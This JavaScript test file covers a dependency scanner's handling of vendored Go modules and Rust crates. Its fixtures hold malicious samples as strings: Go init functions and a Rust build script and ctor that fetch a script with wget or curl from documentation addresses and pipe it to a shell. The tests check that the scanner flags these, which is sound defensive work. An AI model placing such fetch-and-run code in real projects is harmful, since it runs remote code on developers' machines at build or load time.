// --deps reads a Go project's vendor/ and a Rust project's `cargo vendor` tree (0.1.9, Part C): twin of
// python/tests/scanner/test_vendored_code.py (tests/architecture/test_js_parity.py compares the two CLIs on its trees).
// A vendor directory with a modules.txt holds the Go modules a build compiles, one whose crate directories hold a
// .cargo-checksum.json the crates; --deps reads them as the registry reads a module zip and a .crate: the file rules on
// each .go and .rs file a build compiles, the engine's Go reader on each module, its Rust reader on each crate (its
// Cargo.toml read by the engine). Without --deps both trees are pruned. Inert fragments: never built, documentation
// addresses (203.0.113.x).

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run } from "../src/index.js";
import { crateLayout } from "../src/deps.js";
import { vendorKind, neverBuilt } from "../src/lib/fs.js";
import { cargoLayout, goVendoredModules } from "../src/lib/native.js";

const INIT_GO = 'package evil\n\nimport "os/exec"\n\nvar parts = []string{"wget", " -O - ", "https://203.0.113.7/a.sh", ' +
  '" | /bin/bash &"}\n\nfunc init() {\n\tcmd := parts[0] + parts[1] + parts[2] + parts[3]\n' +
  '\texec.Command("/bin/sh", "-c", cmd).Start()\n}\n';
const CLEAN_GO = 'package sub\n\nimport "strings"\n\nfunc Upper(s string) string { return strings.ToUpper(s) }\n';
const BUILD_RS = 'use std::process::Command;\n\nfn main() {\n    let url = format!("https://{}/{}", "203.0.113.9", "x.sh");\n' +
  '    Command::new("sh").arg("-c").arg(format!("curl -s {} | sh", url)).status().ok();\n}\n';
const CTOR_RS = '#[ctor::ctor]\nfn init() {\n    std::process::Command::new("sh").arg("-c").arg("curl -s https://203.0.113.9/s | sh").spawn().ok();\n}\n\npub fn f() {}\n';
const CLEAN_RS = "pub fn add(a: u32, b: u32) -> u32 { a + b }\n";
const BLOB = Buffer.from(Array.from({ length: 240 }, (_, i) => (i * 7919) % 256)).toString("base64");   // (G-5: real base64)
const MODULES_TXT = "# example.test/evil v1.0.0\n## explicit; go 1.21\nexample.test/evil\n" +
  "# example.test/ok v1.2.0\n## explicit\nexample.test/ok/sub\n";
const GO_PROJECT = { "go.mod": "module example.test/app\n\ngo 1.21\n", "main.go": "package main\n\nfunc main() {}\n",
  "vendor/modules.txt": MODULES_TXT };
const RUST_PROJECT = { "Cargo.toml": '[package]\nname = "app"\nversion = "0.1.0"\n', "src/main.rs": "fn main() {}\n" };

function crate(name, files, manifest = null) {
  const body = { ".cargo-checksum.json": '{"files":{},"package":"0"}',
    "Cargo.toml": manifest ?? `[package]\nname = "${name}"\nversion = "1.0.0"\n`, ...files };
  return Object.fromEntries(Object.entries(body).map(([rel, text]) => [`vendor/${name}/${rel}`, text]));
}

function tree(files) {
  const root = mkdtempSync(join(tmpdir(), "lz-vendor-"));
  for (const [rel, data] of Object.entries(files)) {
    const path = join(root, ...rel.split("/"));
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, data);
  }
  return root;
}

function scan(files, deps = true) {
  const root = tree(files);
  const out = mkdtempSync(join(tmpdir(), "lz-vendor-out-"));
  try {
    run(["check", root, "--out-dir", out, "--no-html", "--quiet", ...(deps ? ["--deps"] : [])], { out: () => {}, err: () => {}, env: {} });
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    return rep.issues.filter((i) => i.rule.startsWith("SC-") || i.rule === "Q-SKIPPED-TREE")
      .map((i) => [i.rule, i.sev, i.file.replaceAll("\\", "/"), i.line]);
  } finally {
    rmSync(out, { recursive: true, force: true });
    rmSync(root, { recursive: true, force: true });
  }
}

test("Go: init code a vendored module runs, and the tree pruned without --deps", () => {
  const files = { ...GO_PROJECT, "vendor/example.test/evil/e.go": INIT_GO, "vendor/example.test/ok/sub/s.go": CLEAN_GO };
  assert.deepEqual(scan(files), [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/e.go", 9]]);
  assert.deepEqual(scan(files, false), [["Q-SKIPPED-TREE", "INFO", "vendor", 1]]);
});

test("Go: a module is read whole: init in one package reaching a function of another is start-up code", () => {
  const files = { ...GO_PROJECT,
    "vendor/example.test/evil/e.go": 'package evil\n\nimport "example.test/evil/helper"\n\nfunc init() {\n\thelper.Run()\n}\n',
    "vendor/example.test/evil/helper/h.go": 'package helper\n\nimport "os/exec"\n\nfunc Run() {\n\texec.Command("/bin/sh", ' +
      '"-c", "curl -s https://203.0.113.7/a.sh | sh").Start()\n}\n' };
  assert.deepEqual(scan(files), [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/helper/h.go", 6]]);
});

test("Go: what a build never compiles is not read; a file of no listed module is read with its package", () => {
  const bad = INIT_GO + `\nvar blob = "${BLOB}"\n`;
  for (const name of ["e_test.go", "testdata/t.go", "_x.go", ".x.go"]) {
    assert.deepEqual(scan({ ...GO_PROJECT, "vendor/example.test/evil/ok.go": CLEAN_GO.replace("package sub", "package evil"),
      [`vendor/example.test/evil/${name}`]: bad }), [], name);
  }
  assert.deepEqual(scan({ ...GO_PROJECT, "vendor/example.test/other/x/e.go": INIT_GO.replace("package evil", "package x") }),
    [["SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/other/x/e.go", 9]]);
});

test("Rust: a build script, the manifest's own, and none when it says false", () => {
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("buildevil", { "build.rs": BUILD_RS, "src/lib.rs": CLEAN_RS }),
    ...crate("fine", { "src/lib.rs": CLEAN_RS }) }), [["SC-INSTALL-HOOK", "CRITICAL", "vendor/buildevil/build.rs", 5]]);
  const custom = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = "tools/gen.rs"\n';
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "tools/gen.rs": BUILD_RS, "src/lib.rs": CLEAN_RS }, custom) })
    .map(([r, , f]) => [r, f]), [["SC-INSTALL-HOOK", "vendor/c/tools/gen.rs"]]);
  const off = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = false\n';
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "build.rs": BUILD_RS, "src/lib.rs": CLEAN_RS }, off) }), []);
});

test("Rust: a ctor; tests, benches and examples not read; a vendor directory that is not cargo's", () => {
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "src/lib.rs": CTOR_RS }) }),
    [["SC-IMPORT-RISK", "CRITICAL", "vendor/c/src/lib.rs", 3]]);
  for (const name of ["tests/t.rs", "benches/b.rs", "examples/e.rs"]) {
    assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "src/lib.rs": CLEAN_RS, [name]: CTOR_RS + `pub const K: &str = "${BLOB}";\n` }) }), [], name);
  }
  assert.deepEqual(scan({ ...RUST_PROJECT, "vendor/y/src/lib.rs": CLEAN_RS + `pub const K: &str = "${BLOB}";\n` }, false),
    [["SC-B64", "MAJOR", "vendor/y/src/lib.rs", 2]]);
});

test("Rust: a vendored crate's test items are left out of the file rules (N-20)", () => {
  const tests = `#[cfg(test)]\nmod tests {\n    const V: &str = "${BLOB}";\n}\n`;
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "src/lib.rs": CLEAN_RS + tests }) }), []);
  assert.deepEqual(scan({ ...RUST_PROJECT, ...crate("c", { "src/lib.rs": CLEAN_RS + tests + `pub const K: &str = "${BLOB}";\n` }) }),
    [["SC-B64", "MAJOR", "vendor/c/src/lib.rs", 6]]);
});

test("the helpers: a vendor tree's kind, what is never built, a manifest's layout", () => {
  const root = tree({ "go/vendor/modules.txt": "", "cargo/vendor/c/.cargo-checksum.json": "{}", "plain/vendor/y/x.rs": "",
    "elsewhere.json": "{}" });
  try {
    assert.equal(vendorKind(Buffer.from(join(root, "go", "vendor"))), "go");
    assert.equal(vendorKind(Buffer.from(join(root, "cargo", "vendor"))), "cargo");
    assert.equal(vendorKind(Buffer.from(join(root, "plain", "vendor"))), null);
    let linked = true;
    mkdirSync(join(root, "link", "vendor", "y"), { recursive: true });
    try { symlinkSync(join(root, "elsewhere.json"), join(root, "link", "vendor", "y", ".cargo-checksum.json")); } catch { linked = false; }
    if (linked) assert.equal(vendorKind(Buffer.from(join(root, "link", "vendor"))), null);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
  for (const [kind, rel, want] of [["go", "a/b_test.go", true], ["go", "a/testdata/x.go", true], ["go", "a/_x.go", true],
    ["go", "a/b.go", false], ["crate", "tests/t.rs", true], ["crate", "src/tests/t.rs", false], ["x", "tests/t.rs", false]]) {
    assert.equal(neverBuilt(kind, rel), want, `${kind} ${rel}`);
  }
  assert.deepEqual(cargoLayout('[package]\nbuild = false\n[lib]\npath = "l.rs"\n'), { build: false, lib: "l.rs", proc_macro: null });
  assert.deepEqual(goVendoredModules(MODULES_TXT), ["example.test/evil", "example.test/ok"]);
  const members = ["build.rs", "tools/gen.rs", "src/lib.rs", "src/x.rs"];
  assert.deepEqual(crateLayout('lib = { path = "./src/x.rs", proc-macro = true }\npackage.build = "tools/gen.rs"\n', members),
    ["tools/gen.rs", "src/x.rs", true]);
  assert.deepEqual(crateLayout("", members), ["build.rs", "src/lib.rs", false]);
  assert.deepEqual(crateLayout('[lib]\npath = "../x.rs"\n', members), ["build.rs", null, false]);
});
